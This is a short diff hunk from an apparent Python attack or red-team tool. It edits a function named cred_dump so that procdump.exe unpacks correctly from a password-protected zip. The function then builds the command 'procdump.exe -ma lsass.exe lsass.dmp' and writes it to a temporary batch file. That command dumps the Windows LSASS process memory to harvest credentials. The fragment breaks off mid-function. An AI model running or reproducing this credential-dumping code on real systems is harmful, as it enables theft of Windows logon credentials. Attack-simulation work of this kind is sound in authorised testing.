@@ -68,7 +68,7 @@ def cred_dump():
     print(loc)
     zip = zipfile.ZipFile('testtool.zip')
     password = bytes("demo",'utf-8')
-    zip.extract('procdump.exe')
+    zip.extract('procdump.exe', pwd=password)
     payload = loc + "\\procdump.exe -ma lsass.exe lsass.dmp"
     tmp_file_path = tempfile.gettempdir() + "\\dump.bat"
     with open(tmp_file_path, 'w') as f:
